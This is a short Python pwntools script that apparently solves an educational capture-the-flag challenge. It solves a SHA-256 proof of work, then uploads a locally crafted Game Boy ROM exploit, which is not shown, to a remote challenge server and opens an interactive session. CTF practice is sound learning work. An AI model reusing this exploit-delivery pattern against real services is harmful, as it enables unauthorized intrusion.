#!/usr/bin/env python3
from pwn import *
import hashlib
#context.log_level = 0

def pow_solver(prefix, difficulty):
    zeros = '0' * difficulty

    def is_valid(digest):
        bits = ''.join(bin(i)[2:].zfill(8) for i in digest)
        return bits[:difficulty] == zeros

    i = 0
    while True:
        i += 1
        s = prefix + str(i)
        if is_valid(hashlib.sha256(s.encode()).digest()):
            return str(i)

r = remote('edu-ctf.zoolab.org', 13337)

r.recvuntil(b'sha256(')
powans = pow_solver(r.recvn(16).decode(), 22)

r.sendlineafter(b'POW answer: ', powans.encode())

rom = open('./exploit.gb', 'rb').read()

r.sendlineafter(b'Gameboy ROM size: ', str(len(rom)).encode())
r.sendafter(b'ROM data:\n', rom)

r.interactive()
